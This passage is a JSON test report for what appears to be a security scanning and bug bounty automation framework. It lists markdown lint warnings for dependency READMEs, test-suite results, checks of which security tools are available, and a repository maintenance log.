without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Code block without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Code block without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Code block without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Code block without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Code block without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Code block without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Code block without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Code block without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Code block without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Code block without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Code block without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Code block without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Code block without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Code block without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Code block without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Code block without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Code block without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Code block without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Code block without language specification in node_modules/regexp-tree/README.md\n  - WARNING: Heading level skip in node_modules/color-convert/README.md (line with 'Arrays')\n  - WARNING: Code block without language specification in node_modules/color-convert/README.md\n  - WARNING: Code block without language specification in node_modules/color-convert/README.md\n  - WARNING: Code block without language specification in node_modules/color-convert/README.md\n  - WARNING: Code block without language specification in node_modules/color-convert/README.md\n  - ERROR: Broken internal link in node_modules/flat-cache/README.md: ./changelog.md\n  - WARNING: Code block without language specification in node_modules/flat-cache/README.md\n  - WARNING: Code block without language specification in node_modules/flat-cache/README.md\n  - WARNING: Code block without language specification in node_modules/has-flag/readme.md\n  - WARNING: Code block without language specification in node_modules/has-flag/readme.md\n  - WARNING: Code block without language specification in node_modules/has-flag/readme.md\n  - WARNING: Code block without language specification in node_modules/has-flag/readme.md\n  - WARNING: Code block without language specification in node_modules/has-flag/readme.md\n  - WARNING: Code block without language specification in node_modules/fast-deep-equal/README.md\n  - WARNING: Code block without language specification in node_modules/fast-deep-equal/README.md\n  - WARNING: Code block without language specification in node_modules/fast-deep-equal/README.md\n  - WARNING: Code block without language specification in node_modules/fast-deep-equal/README.md\n  - WARNING: Code block without language specification in node_modules/fast-deep-equal/README.md\n  - WARNING: Code block without language specification in node_modules/fast-deep-equal/README.md\n  - WARNING: Code block without language specification in node_modules/fast-deep-equal/README.md\n  - WARNING: Code block without language specification in node_modules/isexe/README.md\n  - WARNING: Code block without language specification in node_modules/keyv/README.md\n  - WARNING: Code block without language specification in node_modules/keyv/README.md\n  - WARNING: Code block without language specification in node_modules/keyv/README.md\n  - WARNING: Code block without language specification in node_modules/keyv/README.md\n  - WARNING: Code block without language specification in node_modules/keyv/README.md\n  - WARNING: Code block without language specification in node_modules/keyv/README.md\n  - WARNING: Code block without language specification in node_modules/keyv/README.md\n  - WARNING: Code block without language specification in node_modules/keyv/README.md\n  - WARNING: Code block without language specification in node_modules/keyv/README.md\n  - WARNING: Code block without language specification in node_modules/keyv/README.md\n  - WARNING: Code block without language specification in node_modules/keyv/README.md\n  - WARNING: Code block without language specification in node_modules/keyv/README.md\n  - WARNING: Code block without language specification in node_modules/keyv/README.md\n  - WARNING: Code block without language specification in node_modules/keyv/README.md\n  - WARNING: Code block without language specification in node_modules/keyv/README.md\n  - WARNING: Code block without language specification in node_modules/keyv/README.md\n  - ERROR: Broken internal link in node_modules/debug/README.md: ./examples/node/app.js\n  - ERROR: Broken internal link in node_modules/debug/README.md: ./examples/node/worker.js\n  - ERROR: Broken internal link in node_modules/debug/README.md: ./examples/node/stdout.js\n  - WARNING: Heading level skip in node_modules/debug/README.md (line with 'Windows command prompt notes')\n  - WARNING: Heading level skip in node_modules/debug/README.md (line with 'Node.js')\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/debug/README.md\n  - WARNING: Code block without language specification in node_modules/locate-path/readme.md\n  - WARNING: Code block without language specification in node_modules/locate-path/readme.md\n  - WARNING: Code block without language specification in node_modules/locate-path/readme.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/no-callback-literal.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/no-exports-assign.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/no-extraneous-import.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/no-extraneous-require.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/no-missing-import.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/no-missing-require.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/no-unpublished-bin.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/no-unpublished-import.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/no-unpublished-require.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/no-unsupported-features/es-builtins.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/no-unsupported-features/es-syntax.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/no-unsupported-features/node-builtins.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/process-exit-as-throw.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/shebang.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/no-deprecated-api.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/exports-style.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/file-extension-in-import.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/prefer-global/buffer.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/prefer-global/console.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/prefer-global/process.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/prefer-global/text-decoder.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/prefer-global/text-encoder.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/prefer-global/url-search-params.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/prefer-global/url.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/prefer-promises/dns.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/prefer-promises/fs.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/no-hide-core-modules.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/no-unsupported-features.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/no-unsupported-features/es-syntax.md\n  - ERROR: Broken internal link in node_modules/eslint-plugin-node/README.md: ./docs/rules/no-unsupported-features/es-builtins.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-node/README.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-node/README.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-node/README.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-node/README.md\n  - WARNING: Code block without language specification in node_modules/eslint/README.md\n  - WARNING: Code block without language specification in node_modules/eslint/README.md\n  - WARNING: Code block without language specification in node_modules/eslint/README.md\n  - WARNING: Code block without language specification in node_modules/eslint/README.md\n  - WARNING: Code block without language specification in node_modules/shebang-regex/readme.md\n  - WARNING: Code block without language specification in node_modules/shebang-regex/readme.md\n  - WARNING: Code block without language specification in node_modules/shebang-regex/readme.md\n  - WARNING: Code block without language specification in node_modules/import-fresh/readme.md\n  - WARNING: Code block without language specification in node_modules/import-fresh/readme.md\n  - WARNING: Code block without language specification in node_modules/import-fresh/readme.md\n  - WARNING: Code block without language specification in node_modules/import-fresh/readme.md\n  - WARNING: Code block without language specification in node_modules/json-buffer/README.md\n  - WARNING: Code block without language specification in node_modules/word-wrap/README.md\n  - WARNING: Code block without language specification in node_modules/word-wrap/README.md\n  - WARNING: Code block without language specification in node_modules/word-wrap/README.md\n  - WARNING: Code block without language specification in node_modules/word-wrap/README.md\n  - WARNING: Code block without language specification in node_modules/word-wrap/README.md\n  - WARNING: Code block without language specification in node_modules/word-wrap/README.md\n  - WARNING: Code block without language specification in node_modules/word-wrap/README.md\n  - WARNING: Code block without language specification in node_modules/word-wrap/README.md\n  - WARNING: Code block without language specification in node_modules/word-wrap/README.md\n  - WARNING: Code block without language specification in node_modules/word-wrap/README.md\n  - WARNING: Code block without language specification in node_modules/word-wrap/README.md\n  - WARNING: Code block without language specification in node_modules/word-wrap/README.md\n  - WARNING: Code block without language specification in node_modules/strip-json-comments/readme.md\n  - WARNING: Code block without language specification in node_modules/strip-json-comments/readme.md\n  - WARNING: Code block without language specification in node_modules/strip-json-comments/readme.md\n  - WARNING: Code block without language specification in node_modules/strip-json-comments/readme.md\n  - WARNING: Code block without language specification in node_modules/strip-json-comments/readme.md\n  - WARNING: Code block without language specification in node_modules/strip-json-comments/readme.md\n  - WARNING: Code block without language specification in node_modules/regexpp/README.md\n  - WARNING: Code block without language specification in node_modules/regexpp/README.md\n  - WARNING: Code block without language specification in node_modules/resolve-from/readme.md\n  - WARNING: Code block without language specification in node_modules/resolve-from/readme.md\n  - WARNING: Code block without language specification in node_modules/resolve-from/readme.md\n  - WARNING: Code block without language specification in node_modules/resolve-from/readme.md\n  - ERROR: Broken internal link in node_modules/flatted/README.md: ./flatted.jpg\n  - ERROR: Broken internal link in node_modules/flatted/README.md: ./php/flatted.php\n  - ERROR: Broken internal link in node_modules/flatted/README.md: ./python/flatted.py\n  - WARNING: Code block without language specification in node_modules/flatted/README.md\n  - WARNING: Code block without language specification in node_modules/flatted/README.md\n  - WARNING: Code block without language specification in node_modules/flatted/README.md\n  - WARNING: Code block without language specification in node_modules/flatted/README.md\n  - WARNING: Code block without language specification in node_modules/p-limit/readme.md\n  - WARNING: Code block without language specification in node_modules/p-limit/readme.md\n  - WARNING: Code block without language specification in node_modules/p-limit/readme.md\n  - WARNING: Code block without language specification in node_modules/eslint-utils/node_modules/eslint-visitor-keys/README.md\n  - WARNING: Code block without language specification in node_modules/eslint-utils/node_modules/eslint-visitor-keys/README.md\n  - WARNING: Code block without language specification in node_modules/eslint-utils/node_modules/eslint-visitor-keys/README.md\n  - WARNING: Code block without language specification in node_modules/eslint-utils/node_modules/eslint-visitor-keys/README.md\n  - WARNING: Code block without language specification in node_modules/eslint-utils/node_modules/eslint-visitor-keys/README.md\n  - WARNING: Code block without language specification in node_modules/eslint-utils/node_modules/eslint-visitor-keys/README.md\n  - WARNING: Code block without language specification in node_modules/eslint-utils/node_modules/eslint-visitor-keys/README.md\n  - WARNING: Code block without language specification in node_modules/eslint-utils/node_modules/eslint-visitor-keys/README.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/the-dangers-of-square-bracket-notation.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/the-dangers-of-square-bracket-notation.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/the-dangers-of-square-bracket-notation.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/the-dangers-of-square-bracket-notation.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/the-dangers-of-square-bracket-notation.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/the-dangers-of-square-bracket-notation.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/the-dangers-of-square-bracket-notation.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/bypass-connect-csrf-protection-by-abusing.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/bypass-connect-csrf-protection-by-abusing.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/regular-expression-dos-and-node.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/regular-expression-dos-and-node.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/regular-expression-dos-and-node.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/regular-expression-dos-and-node.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/avoid-command-injection-node.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/avoid-command-injection-node.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/avoid-command-injection-node.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/avoid-command-injection-node.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/avoid-command-injection-node.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/avoid-command-injection-node.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/avoid-command-injection-node.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/rules/detect-object-injection.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/rules/detect-object-injection.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/rules/detect-object-injection.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/rules/detect-object-injection.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/rules/detect-bidi-characters.md\n  - WARNING: Code block without language specification in node_modules/eslint-plugin-security/docs/rules/detect-bidi-characters.md\n  - WARNING: Code block without language specification in node_modules/@eslint/eslintrc/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/eslintrc/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/eslintrc/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/js/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/js/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/plugin-kit/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/plugin-kit/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/plugin-kit/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/plugin-kit/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/plugin-kit/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/plugin-kit/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/plugin-kit/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/plugin-kit/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/config-helpers/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/config-helpers/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/config-helpers/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/config-helpers/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/object-schema/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/object-schema/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/object-schema/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/object-schema/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/object-schema/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/object-schema/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/object-schema/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/object-schema/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/config-array/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/config-array/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/config-array/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/config-array/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/config-array/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/config-array/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/config-array/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/config-array/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/config-array/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/config-array/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/config-array/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/config-array/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/config-array/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/config-array/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint/config-array/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint-community/regexpp/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint-community/regexpp/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint-community/eslint-utils/node_modules/eslint-visitor-keys/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint-community/eslint-utils/node_modules/eslint-visitor-keys/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint-community/eslint-utils/node_modules/eslint-visitor-keys/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint-community/eslint-utils/node_modules/eslint-visitor-keys/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint-community/eslint-utils/node_modules/eslint-visitor-keys/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint-community/eslint-utils/node_modules/eslint-visitor-keys/README.md\n  - WARNING: Code block without language specification in node_modules/@eslint-community/eslint-utils/node_modules/eslint-visitor-keys/README.md\n  - WARNING: Heading level skip in node_modules/@humanfs/core/README.md (line with 'Deno')\n  - WARNING: Heading level skip in node_modules/@humanfs/core/README.md (line with 'Browser')\n  - WARNING: Code block without language specification in node_modules/@humanfs/core/README.md\n  - WARNING: Code block without language specification in node_modules/@humanfs/core/README.md\n  - WARNING: Code block without language specification in node_modules/@humanfs/core/README.md\n  - WARNING: Code block without language specification in node_modules/@humanfs/core/README.md\n  - WARNING: Code block without language specification in node_modules/@humanfs/core/README.md\n  - WARNING: Code block without language specification in node_modules/@humanfs/core/README.md\n  - WARNING: Code block without language specification in node_modules/@humanfs/core/README.md\n  - WARNING: Code block without language specification in node_modules/@humanfs/core/README.md\n  - WARNING: Code block without language specification in node_modules/@humanfs/core/README.md\n  - WARNING: Code block without language specification in node_modules/@humanfs/node/README.md\n  - WARNING: Code block without language specification in node_modules/@humanfs/node/README.md\n  - WARNING: Code block without language specification in node_modules/@humanfs/node/README.md\n  - WARNING: Code block without language specification in node_modules/@humanfs/node/README.md\n  - WARNING: Code block without language specification in node_modules/@humanfs/node/README.md\n  - WARNING: Heading level skip in node_modules/@humanwhocodes/retry/README.md (line with 'Deno')\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/retry/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/retry/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/retry/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/retry/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/retry/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/retry/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/retry/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/retry/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/retry/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/retry/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/retry/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/retry/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/retry/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/retry/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/retry/README.md\n  - WARNING: Heading level skip in node_modules/@humanwhocodes/module-importer/README.md (line with 'Bun')\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/module-importer/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/module-importer/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/module-importer/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/module-importer/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/module-importer/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/module-importer/README.md\n  - WARNING: Code block without language specification in node_modules/@humanwhocodes/module-importer/README.md\n  - WARNING: Heading level skip in node_modules/@types/estree/README.md (line with 'Additional Details')\n  - WARNING: Heading level skip in node_modules/@types/json-schema/README.md (line with 'Additional Details')\n",
    "stderr": "",
    "timestamp": "2025-09-14T19:23:19.370209"
  },
  "existing_test_suites": [
    {
      "name": "Enhanced Test Suite",
      "success": true,
      "duration": 5.075970649719238,
      "returncode": 0,
      "stdout": "\ud83e\uddea Starting Enhanced Comprehensive Test Suite for Bl4ckC3ll_PANTHEON\n======================================================================\n\n\ud83d\udd0d Running TestEnhancedCLI...\n\u2705 TestEnhancedCLI: 3/3 tests passed\n\n\ud83d\udd0d Running TestEnhancedWordlists...\n\u2705 TestEnhancedWordlists: 3/3 tests passed\n\n\ud83d\udd0d Running TestEnhancedScanning...\n\u2705 TestEnhancedScanning: 2/2 tests passed\n\n\ud83d\udd0d Running TestOutputFormats...\n\u2705 TestOutputFormats: 1/1 tests passed\n\n\ud83d\udd0d Running TestIntegration...\n\u2705 TestIntegration: 2/2 tests passed\n\n\ud83d\udd0d Running TestPerformance...\n\u2705 TestPerformance: 2/2 tests passed\n\n\ud83d\udd0d Running TestErrorHandling...\n\u2705 TestErrorHandling: 3/3 tests passed\n\n======================================================================\n\ud83d\udcca ENHANCED TEST SUMMARY\n======================================================================\nTotal Tests Run: 16\nSuccessful: 16\nFailures: 0\nErrors: 0\nSuccess Rate: 100.0%\n\n\ud83c\udf89 All tests passed! Enhanced Bl4ckC3ll_PANTHEON is ready for production.\n",
      "stderr": "",
      "timestamp": "2025-09-14T19:23:24.446240"
    },
    {
      "name": "Final Integration Test",
      "success": true,
      "duration": 0.3900184631347656,
      "returncode": 0,
      "stdout": "\ud83d\udd2c Final Comprehensive Integration Test\n==================================================\nTesting enhanced Bl4ckC3ll_PANTHEON framework...\n\nRunning: Main Script Execution\n\ud83d\ude80 Testing Main Script Execution\n----------------------------------------\n\u2705 Main script executes successfully\n\u26a0\ufe0f Some enhanced options may be missing\n\u2705 Main Script Execution: PASSED\n\nRunning: Integration Functions\n\n\ud83d\udd27 Testing Integration Functions\n----------------------------------------\nTesting auto-dependency fixes...\n\u001b[92m2025-09-14 19:23:24 - SUCCESS - Dependencies auto-fix completed\u001b[0m\n\u2705 Auto-dependency fix working\nTesting configuration...\n\u2705 Configuration loaded: 17 sections\n\u2705 BCAR integration available\n\u2705 Wordlists available: 3/3\n\u2705 Integration functions test completed\n\u2705 Integration Functions: PASSED\n\nRunning: Tool Coverage\n\n\ud83d\udee0\ufe0f Testing Security Tool Coverage\n----------------------------------------\n\nCore Security:\n  \u274c nmap\n  \u274c nuclei\n  \u274c sqlmap\n\nReconnaissance:\n  \u274c subfinder\n  \u2705 httpx\n  \u274c katana\n\nDiscovery:\n  \u274c ffuf\n  \u274c gau\n  \u274c waybackurls\n\nAnalysis:\n  \u274c dalfox\n  \u274c subjack\n  \u274c gospider\n\nOverall Tool Coverage: 1/12 (8.3%)\n\u26a0\ufe0f Limited tool coverage - development environment detected\n  Run install.sh to install security tools for full functionality\n\u2705 Tool coverage test completed\n\u2705 Tool Coverage: PASSED\n\nRunning: Enhanced Features\n\n\ud83c\udfaf Testing Enhanced Features\n----------------------------------------\n\u2705 run_enhanced_bug_bounty_automation\n\u2705 run_comprehensive_bug_bounty_scan\n\u2705 run_enhanced_subdomain_enumeration\n\u2705 search_certificate_transparency\n\u2705 run_enhanced_port_scanning\n\u2705 run_enhanced_web_discovery\n\u2705 run_enhanced_vulnerability_assessment\n\nEnhanced Functions Available: 7/7\n\u2705 Directory wordlists_extra exists\n\u2705 Directory external_lists exists\n\u2705 Directory payloads exists\n\u2705 Directory runs exists\nEssential Directories: 4/4\nFunctionality Score: 100.0%\nDirectory Structure Score: 100.0%\n\u2705 Enhanced features fully available\n\u2705 Enhanced features test completed\n\u2705 Enhanced Features: PASSED\n\nRunning: Bug Bounty Functions\n\n\ud83c\udff9 Quick Bug Bounty Function Test\n----------------------------------------\nTesting certificate transparency search...\nCertificate transparency search failed for https://crt.sh/?q=%25.example.com&output=json: HTTPSConnectionPool(host='crt.sh', port=443): Max retries exceeded with url: /?q=%25.example.com&output=json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x7f40c5e52630>: Failed to resolve 'crt.sh' ([Errno -5] No address associated with hostname)\"))\n\u2705 CT search returned 0 results\n\u2705 Test configuration created\n\u2705 Subdomain enumeration function available\n\u2705 Bug bounty functions are ready\n\u2705 Bug bounty quick test completed\n\u2705 Bug Bounty Functions: PASSED\n\n==================================================\n\ud83c\udfc6 FINAL TEST RESULTS\n==================================================\nTests Passed: 5/5 (100.0%)\n\ud83c\udf89 EXCELLENT: Framework is fully enhanced and ready!\n\u2705 All major enhancements completed successfully\n\u2705 Bug bounty automation integrated\n\u2705 BCAR integration working\n\u2705 Auto-chain functionality available\n\u2705 Comprehensive error handling implemented\n",
      "stderr": "",
      "timestamp": "2025-09-14T19:23:24.836336"
    },
    {
      "name": "Test Automation Integration",
      "success": true,
      "duration": 0.2206268310546875,
      "returncode": 0,
      "stdout": "\ud83d\udd27 Bl4ckC3ll_PANTHEON Automation Integration Test Suite\n============================================================\n\n\ud83d\udd0d ESLint Integration\n----------------------------------------\nTesting ESLint integration...\n\u2713 ESLint integration configuration validated\n\u2705 PASSED\n\n\ud83d\udd0d Bug Bounty Script\n----------------------------------------\nTesting bug bounty commands script...\n\u2713 Bug bounty script validated\n\u2705 PASSED\n\n\ud83d\udd0d Enhanced Application Features\n----------------------------------------\nTesting enhanced application features...\n\u2713 Test passed\n\u2705 PASSED\n\n\ud83d\udd0d GitHub Workflow Integration\n----------------------------------------\nTesting GitHub Actions workflow integration...\n\u2713 Test passed\n\u2705 PASSED\n\n\ud83d\udd0d Automation Chain Integration\n----------------------------------------\nTesting automation chain integration...\n\u2139 Configuration section 'eslint' not found (optional)\n\u2139 Configuration section 'bug_bounty' not found (optional)\n\u2139 Configuration section 'automation_chain' not found (optional)\n\u2713 Test passed\n\u2705 PASSED\n\n\ud83d\udd0d Security and Compliance\n----------------------------------------\nTesting security and compliance...\n\u2713 Test passed\n\u2705 PASSED\n\n\ud83d\udcca Test Results Summary\n============================================================\nESLint Integration: \u2705 PASSED\nBug Bounty Script: \u2705 PASSED\nEnhanced Application Features: \u2705 PASSED\nGitHub Workflow Integration: \u2705 PASSED\nAutomation Chain Integration: \u2705 PASSED\nSecurity and Compliance: \u2705 PASSED\n\n\ud83d\udcc8 Overall: 6/6 tests passed\n\ud83c\udf89 All automation integration tests PASSED!\n",
      "stderr": "",
      "timestamp": "2025-09-14T19:23:25.057061"
    }
  ],
  "repository_management": {
    "name": "Repository Management",
    "success": true,
    "duration": 242.960706949234,
    "returncode": 0,
    "stdout": "Files removed: 811\n\ud83e\udd16 Starting Intelligent Repository Management Cycle\n============================================================\n\ud83c\udfe5 Checking repository health...\n\ud83d\udd27 Running automated maintenance...\n  \ud83e\uddf9 Running cleanup tasks...\n  \ud83d\udcca Generating maintenance reports...\n\u26a1 Optimizing repository...\n  \ud83d\udce6 Compressing assets...\n  \ud83d\udcbe Optimizing dependency cache...\n\ud83d\udcca Monitoring repository status...\n\ud83d\udd00 Checking for auto-merge eligible PRs...\n\n\u2705 Repository management cycle completed!\n\u23f1\ufe0f  Duration: 242.84 seconds\n\ud83c\udfe5 Health Status: warning\n\ud83d\udd27 Maintenance Tasks: 3 completed\n\u26a1 Optimizations: 2 applied\n\ud83d\udcca Alerts: 2 active\n\ud83d\udcc1 Report saved: repo-management-report.json\n",
    "stderr": "",
    "timestamp": "2025-09-14T19:27:28.017848"
  }
}